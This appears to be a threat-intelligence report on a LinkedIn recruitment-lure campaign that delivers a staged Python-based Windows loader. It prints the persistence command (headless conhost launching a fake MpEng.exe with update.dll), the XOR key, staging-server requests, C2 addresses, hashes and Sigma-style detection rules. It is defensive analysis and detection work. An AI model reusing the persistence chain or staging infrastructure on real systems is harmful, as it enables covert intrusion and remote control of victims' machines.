# Professional Threat Report: LinkedIn Recruitment Lure Malware Campaign

**Report date:** 27 April 2026  
**Source material:** Static and dynamic analysis write-ups supplied by Jamie Roberts / Rayza-Slyce  
**Investigation type:** Malware delivery, staged payload analysis, network behaviour review  
**Assessment status:** Malicious activity confirmed based on observed execution, persistence, payload staging, obfuscation and outbound infrastructure communication.

---

## 1. Executive Summary

A recruitment-themed lure was used to deliver a malicious ZIP archive via a trusted-platform delivery chain involving LinkedIn, Google Forms, a `tr.ee` shortlink and Dropbox-hosted content. The lure impersonated a legitimate-looking job opportunity and directed the user towards a ZIP archive containing an executable disguised as job-related documentation.

Static and dynamic analysis showed that the delivered archive was not a legitimate recruitment package. It contained a staged malware execution chain using disguised file types, a batch-script orchestrator, a password-protected archive, a bundled Python runtime masquerading as a Microsoft Defender-related process, a fake `.dll` Python loader, encrypted payload content, scheduled-task persistence and outbound communication with external infrastructure.

The observed behaviour is consistent with a multi-stage loader or backdoor-style implant. The malware establishes user-level persistence, retrieves additional staged content from external infrastructure and maintains sustained encrypted communication with a secondary remote host.

No attribution to the impersonated organisation is supported by the evidence. The company name appears to have been abused as a social-engineering pretext.

---

## 2. Key Findings

| Finding | Assessment | Confidence |
|---|---:|---:|
| Recruitment lure used to drive user interaction | Confirmed | High |
| Trusted platforms used in delivery chain: Google Forms, shortlink, Dropbox | Confirmed | High |
| ZIP archive contains executable disguised as a job document | Confirmed | High |
| Multiple files use misleading extensions or names | Confirmed | High |
| `Deju` batch script orchestrates extraction, execution and persistence | Confirmed | High |
| `zhen.mkv` is not a video file; it functions as a WinRAR command-line extraction component | Confirmed | High |
| `TAIWAN.pdf` is not a PDF; it is a password-protected archive | Confirmed | High |
| `MpEng.exe` is not Microsoft Defender; it appears to be a Python runtime/wrapper | Confirmed | High |
| `update.dll` is not a PE DLL; it is a Python loader script | Confirmed | High |
| `support.ico` contains encrypted payload content decoded by `update.dll` | Confirmed | High |
| Persistence is created via a scheduled task named `Windows Update Check` | Confirmed | High |
| Remote payload/staging traffic observed to `172.86.89.235` | Confirmed | High |
| Sustained encrypted session observed to `15.235.156.143:56001` | Observed, likely C2 | Medium-High |
| Telegram infrastructure contacted shortly after execution | Observed | Medium |
| Final payload capabilities such as exfiltration, credential theft or lateral movement | Not fully proven | Low/Unknown |

---

## 3. Attack Chain Overview

1. A LinkedIn recruitment-themed lure directs the user to a Google Form.
2. The Google Form contains a link offering further job information.
3. The link routes through a `tr.ee` shortlink.
4. The shortlink redirects to a Dropbox-hosted ZIP archive.
5. The archive contains an executable named to resemble job-related documentation.
6. On execution, a decoy document opens to distract the user.
7. Background execution begins through a staged local chain.
8. `Deju` orchestrates execution, extraction and persistence.
9. `zhen.mkv`, a renamed WinRAR command-line component, extracts `TAIWAN.pdf`.
10. `TAIWAN.pdf`, actually a password-protected archive, extracts a bundled Python environment and payload components.
11. Components are staged under the user profile, including under `AppData\Local\Microsoft\WindowsApps`.
12. A scheduled task named `Windows Update Check` is created to run every 10 minutes.
13. The task launches `WinUpdate.bat`, which starts `conhost.exe --headless` and runs the fake `MpEng.exe` Python wrapper with `update.dll` and the argument `sunset`.
14. `update.dll` decrypts `support.ico` using XOR key `ditmechina` and executes decrypted payload content in memory.
15. Network activity includes retrieval of staged content from `172.86.89.235` and sustained encrypted communication with `15.235.156.143:56001`.

---

## 4. Delivery and Social Engineering

The delivery method uses a realistic recruitment pretext. The initial route passes through legitimate or trusted services, which improves user trust and may reduce the chance of early blocking:

- LinkedIn as the social platform / lure source
- Google Forms as the trust layer
- `tr.ee` as a redirect/shortlink layer
- Dropbox as the file-hosting layer

The chain does not appear to rely on browser exploitation or automatic code execution. The attack depends on the user downloading, extracting and executing the disguised file.

### Delivery Chain

```text
LinkedIn recruitment lure
  -> Google Form
    -> tr.ee shortlink
      -> Dropbox-hosted ZIP archive
        -> disguised executable
          -> staged malware execution
```

---

## 5. Archive Contents and Local Components

The original archive contained multiple files that appeared to be documents, media or support files but were later shown to play roles in execution.

### Notable Original Components

| Component | Claimed / apparent role | Observed role |
|---|---|---|
| `Position Details and Compensation Policy For Emp.EXE` | Job-related document | Initial executable |
| `AppvIsvSubsystems64.dll` | Legitimate-looking DLL name | Possible sideloading-related component |
| `c2r64.dll` | DLL | Large suspicious binary observed during static analysis |
| `zhen.mkv` | Video file | Renamed WinRAR command-line extraction component |
| `TAIWAN.pdf` | PDF document | Password-protected archive |
| `Deju` | Unclear/extensionless file | Batch script orchestrator |
| Decoy document | Job/recruitment content expected | Opens visible decoy content after execution |

### Dropped / Staged Components

| Component | Location / role |
|---|---|
| `MpEng.exe` | Fake Microsoft Defender-style process name; appears to be a Python runtime/wrapper |
| `update.dll` | Python script disguised as DLL; decrypts and executes `support.ico` |
| `support.ico` | Encrypted/obfuscated payload content |
| `WinUpdate.bat` | Script used by scheduled task to relaunch payload |

---

## 6. Execution Behaviour

Execution begins when the user launches the disguised `.EXE`. A decoy document opens immediately, likely to make the user believe the expected file has opened successfully.

Behind the visible decoy, execution proceeds through the staged local chain:

- `Deju` launches the decoy and controls the extraction process.
- `zhen.mkv` is used as an extraction utility rather than media.
- `TAIWAN.pdf` is extracted using an embedded password.
- A large bundled Python environment is unpacked.
- `MpEng.exe` masquerades as a Defender-related process while showing indicators of a Python-based wrapper.
- `update.dll` is executed as script content rather than as a real DLL.
- `support.ico` is decrypted and executed in memory.

This architecture indicates deliberate obfuscation and staging. Functionality is split across several misleadingly named components rather than contained in a single obvious payload.

---

## 7. Persistence Mechanism

Persistence is established through a scheduled task:

```text
Task name: Windows Update Check
Trigger: Every 10 minutes
Action: WinUpdate.bat
```

Observed `WinUpdate.bat` command:

```bat
start "" /min conhost.exe --headless "C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\MpEng.exe" "C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\update.dll" sunset
```

This mechanism provides repeat execution under the current user context. The use of `conhost.exe --headless`, a minimised window and a Windows-update-themed task name reduces user visibility and makes the activity appear more legitimate at a glance.

---

## 8. Payload Obfuscation and Loader Behaviour

### `update.dll`

Despite the `.dll` extension, `update.dll` was identified as ASCII text containing Python code rather than a valid PE/DLL file.

The script:

- Reads `support.ico` from the same directory
- Applies XOR decryption using the key `ditmechina`
- Dynamically executes the decrypted content using Python execution logic

The effective behaviour is:

```text
read support.ico
  -> XOR decrypt with key "ditmechina"
    -> execute decrypted payload content in memory
```

### `support.ico`

`support.ico` is not treated as an icon by the malware. It contains encrypted payload material. After XOR decoding, further obfuscated Python content and compressed/encoded data were observed.

Notable decoded strings / artefacts included:

- `<lambda>`
- `getattr`
- `map`
- `chr`
- `active_domain`
- `active_domain_file`
- `index`
- `environ`
- `HELLO DECOMPILER`

These indicators suggest dynamically executed and intentionally obfuscated Python content. The exact final payload capability was not fully reversed in the supplied analysis, so specific claims such as credential theft, data exfiltration or lateral movement should not be treated as confirmed.

---

## 9. Network Behaviour

### Burp Suite Observation

Proxy-based HTTP/HTTPS monitoring did not reveal clearly malicious proxy-aware traffic. Observed requests were consistent with standard Windows behaviour, including Microsoft SmartScreen and trust-validation traffic.

This did not clear the payload. It showed that proxy-only inspection was insufficient.

### Wireshark Observation

Packet-level capture revealed outbound communication shortly after execution.

#### Telegram Infrastructure

```text
t.me -> 149.154.167.99
```

A TLS session was observed following DNS resolution. The Telegram IP is legitimate infrastructure and should not be treated as malicious by itself. In this context, the timing suggests possible abuse for signalling, discovery, notification or communication support.

#### Staging / Payload Server

```text
172.86.89.235:80
```

Observed HTTP request:

```http
GET /getPage?id=sunset HTTP/1.1
Host: 172.86.89.235
User-Agent: python-requests/2.33.0
```

Observed response returned a secondary resource:

```text
hxxp://172.86.89.235/links/sunset.txt
```

A follow-up request retrieved:

```text
/links/sunset.txt
```

The returned content contained additional obfuscated Python-style payload material. The observed `python-requests` user agent, `sunset` execution parameter and remote staged content strongly support the assessment that this host functions as a staging or payload-delivery server.

#### Sustained Encrypted Communication

```text
15.235.156.143:56001
```

Observed characteristics:

- Sustained TLS communication over an extended capture period
- Non-standard open port: `56001/tcp`
- Ports 80 and 443 filtered / unavailable
- TLS service presented a self-signed certificate
- Certificate common name appeared randomised: `Pzyzvzapjmw`
- Certificate validity extended unusually far into the future

This behaviour is consistent with a persistent encrypted communication endpoint. Because the TLS content was not decrypted and no operator-side commands were directly observed, the most accurate wording is:

> `15.235.156.143:56001` is a likely persistent C2 endpoint based on timing, session duration, non-standard TLS service characteristics and its position in the execution chain.

---

## 10. Infrastructure Summary

| Indicator | Role assessed from behaviour | Notes |
|---|---|---|
| `tr.ee` shortlink | Redirect layer | Used to obscure destination |
| Dropbox URL | Payload hosting | Hosted ZIP archive |
| `149.154.167.99` | Telegram infrastructure contacted after execution | Legitimate infrastructure potentially abused |
| `172.86.89.235` | Staging / payload delivery | Served `/getPage?id=sunset` and `/links/sunset.txt` |
| `15.235.156.143:56001` | Likely persistent C2 endpoint | Sustained TLS on non-standard port with self-signed certificate |

---

## 11. MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence / rationale |
|---|---|---:|---|
| Initial Access | Phishing: Spearphishing Link | T1566.002 | Recruitment lure uses link chain to deliver malware |
| Execution | User Execution: Malicious File | T1204.002 | User must execute disguised `.EXE` |
| Execution | Command and Scripting Interpreter: Windows Command Shell | T1059.003 | `Deju` and `WinUpdate.bat` batch execution |
| Execution | Command and Scripting Interpreter: Python | T1059.006 | Python runtime/wrapper and Python loader logic observed |
| Persistence | Scheduled Task/Job: Scheduled Task | T1053.005 | `Windows Update Check` scheduled task runs every 10 minutes |
| Defense Evasion | Masquerading | T1036 | Misleading process/file names and trusted-looking task name |
| Defense Evasion | Masquerading: Match Legitimate Name or Location | T1036.005 | `MpEng.exe`, `WindowsApps`, `Windows Update Check` naming/location choices |
| Defense Evasion | Masquerading: Masquerade File Type | T1036.008 | `.mkv`, `.pdf`, `.dll`, `.ico` extensions do not match true function |
| Defense Evasion | Obfuscated Files or Information | T1027 | XOR, Base64, bzip2, zlib and dynamic Python execution patterns |
| Defense Evasion | Deobfuscate/Decode Files or Information | T1140 | Payload content decoded at runtime before execution |
| Command and Control | Application Layer Protocol: Web Protocols | T1071.001 | HTTP request to `/getPage?id=sunset` and `/links/sunset.txt` |
| Command and Control | Ingress Tool Transfer | T1105 | Retrieval of additional staged payload content from remote server |
| Command and Control | Encrypted Channel | T1573 | Sustained TLS session to `15.235.156.143:56001` |
| Command and Control | Non-Standard Port | T1571 | TLS service observed on port `56001/tcp` |
| Command and Control | Web Service | T1102 | Telegram infrastructure contacted; potential abuse of legitimate web service |

**Note:** ATT&CK mapping is behavioural and based on observed evidence. It should not be interpreted as attribution to any known group or malware family.

---

## 12. Indicators of Compromise

### File Hashes

| File | SHA256 |
|---|---|
| Dropbox ZIP package | `f689830f201ed1612bfda4bb48e9dfba4bde9d2c4abc724f6e9f95060797e739` |
| `Position Details and Compensation Policy For Emp.EXE` | `59dbc225207fb303c9eccc7b962c82ae212f5d302703d3154178b8afceeccd3c` |
| `zhen.mkv` | `bdbe2bde697c45e02902f19415d7af07dc871f30a3ac84fb552657aeddc38714` |
| `TAIWAN.pdf` | `319f354617ac4c1fd0ab4eed12ac762436439bef2d8bc65a4517fb4b4dd0a06f` |
| `Deju` | `969c43c279517b106abaf5002613f950cff63aae6b74c7b3261e8cfc0b153dc0` |
| `MpEng.exe` | `ddd49d119c318e41ab21cdaa0d938987880dba167491e7c47ce2708a1f9883cd` |
| `update.dll` | `0797e1cc05267f2a9e14236b0730bcd63da1c73cf6e0a842ebea9732fb8955c3` |
| `support.ico` | `51743a64b0335e02e9098f4daae063e0cd345962a7b351ef7846d7ab90385ddb` |
| `sunset_payload.txt` | `0dd45d76181a5eb83d9d2e116eeb498a387f567c3ec023eab338a6ff5a6c8466` |

### File / Path Indicators

```text
C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\MpEng.exe
C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\update.dll
C:\Users\<user>\AppData\Local\Microsoft\WindowsApps\WinUpdate.bat
support.ico
zhen.mkv
TAIWAN.pdf
Deju
Position Details and Compensation Policy For Emp.EXE
```

### Persistence Indicators

```text
Scheduled task name: Windows Update Check
Scheduled task action: WinUpdate.bat
Scheduled task frequency: Every 10 minutes
Command pattern: conhost.exe --headless
Command pattern: start "" /min
Argument observed: sunset
```

### Network Indicators

```text
149.154.167.99
172.86.89.235
15.235.156.143
15.235.156.143:56001
hxxp://172[.]86[.]89[.]235/getPage?id=sunset
hxxp://172[.]86[.]89[.]235/links/sunset[.]txt
User-Agent: python-requests/2.33.0
TLS certificate CN observed: Pzyzvzapjmw
```

### Abuse / Hosting Context From Investigation

| Indicator | Context |
|---|---|
| `172.86.89.235` | Reported in source write-up as RouterHosting LLC / Cloudzy infrastructure |
| `15.235.156.143` | Reported in source write-up as OVH Singapore VPS infrastructure |
| `149.154.167.99` | Telegram infrastructure; legitimate service potentially abused |

---

## 13. Detection and Hunting Opportunities

### Host-Based Hunting

Look for:

```text
Scheduled task named "Windows Update Check" created by a non-administrative user or unusual process
Execution of WinUpdate.bat from AppData paths
conhost.exe launched with --headless
Process command lines containing MpEng.exe update.dll sunset
MpEng.exe running from user-writable paths rather than legitimate Defender locations
Files named update.dll that are ASCII/Python content rather than PE files
Files with document/media/icon extensions that do not match their file signature
Python runtime components staged under AppData\Local\Microsoft\WindowsApps
```

### Network-Based Hunting

Look for:

```text
HTTP GET /getPage?id=sunset
HTTP GET /links/sunset.txt
User-Agent: python-requests/2.33.0 from non-developer endpoints
Outbound TLS to 15.235.156.143:56001
Long-lived TLS sessions to non-standard ports from user workstations
Connections to Telegram infrastructure immediately after suspicious file execution
```

### Example Sigma-Style Detection Logic (Pseudo)

```yaml
title: Suspicious Headless Conhost Launching Python-Masqueraded Payload
status: experimental
description: Detects command pattern observed in the LinkedIn recruitment lure malware chain.
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\conhost.exe'
    CommandLine|contains|all:
      - '--headless'
      - 'MpEng.exe'
      - 'update.dll'
  condition: selection
level: high
```

```yaml
title: Suspicious Windows Update Named Scheduled Task Running User AppData Script
status: experimental
description: Detects scheduled task persistence using a Windows Update themed name and user-writable path.
logsource:
  product: windows
  service: security
detection:
  selection:
    TaskName|contains: 'Windows Update Check'
    TaskContent|contains|all:
      - 'WinUpdate.bat'
      - 'AppData\Local\Microsoft\WindowsApps'
  condition: selection
level: high
```

---

## 14. Risk Assessment

This sample presents a high risk to affected systems.

Confirmed behaviours include:

- User-level persistence
- Hidden/minimised recurring execution
- Local staging of a bundled runtime
- Payload decryption and in-memory execution
- Remote staged payload retrieval
- Sustained encrypted communication with external infrastructure

Potential impacts, depending on final payload capability, include:

- Remote command execution
- Additional payload delivery
- Data theft or credential theft
- Long-term access to the infected host
- Use of the infected host as a foothold for further activity

These potential impacts are plausible based on the architecture, but they were not all directly proven in the supplied analysis. The strongest evidence supports classification as a multi-stage loader/backdoor-style implant with persistence and remote communications.

---

## 15. Recommended Actions

### For Hosting / Platform Abuse Teams

1. Review and suspend/remove hosted payload content associated with the Dropbox delivery link.
2. Review `172.86.89.235` for malware staging activity, specifically:
   - `/getPage?id=sunset`
   - `/links/sunset.txt`
3. Review `15.235.156.143:56001` for C2-like TLS service activity and related VPS abuse.
4. Review Telegram abuse reports for possible use of `t.me` / Telegram infrastructure in malware signalling or operator notification.
5. Preserve relevant logs if possible, including access logs, server process metadata, account creation metadata and payment/registration artefacts.

### For Defenders / Incident Responders

1. Search endpoints for the file hashes and path indicators listed above.
2. Hunt for scheduled task `Windows Update Check` and suspicious `WinUpdate.bat` execution.
3. Inspect `AppData\Local\Microsoft\WindowsApps` for suspicious Python runtime staging.
4. Review process telemetry for `conhost.exe --headless` launching user-writable executables.
5. Block or monitor connections to listed network indicators.
6. If indicators are found, isolate affected endpoints and collect volatile evidence before remediation.
7. Assume persistence may survive simple deletion of the original downloaded ZIP or visible decoy file.

---

## 16. Reporting Summary

This campaign uses a recruitment lure to deliver a staged Windows malware package. The observed malware chain creates persistence, stages a bundled Python runtime, executes obfuscated content from disguised files and retrieves additional payload material from external infrastructure.

The most important operational indicators are:

```text
Initial payload SHA256:
f689830f201ed1612bfda4bb48e9dfba4bde9d2c4abc724f6e9f95060797e739

Staging server:
172.86.89.235
hxxp://172[.]86[.]89[.]235/getPage?id=sunset
hxxp://172[.]86[.]89[.]235/links/sunset[.]txt

Likely persistent C2 endpoint:
15.235.156.143:56001

Persistence:
Scheduled task "Windows Update Check"
WinUpdate.bat every 10 minutes
conhost.exe --headless ... MpEng.exe update.dll sunset
```

The activity should be treated as malicious and suitable for takedown / abuse review.

---

## 17. Source Write-Ups

The analysis in this report is derived from the supplied investigation write-ups:

- Part 1: Static Analysis
- Part 2: Dynamic Analysis & Payload Behaviour

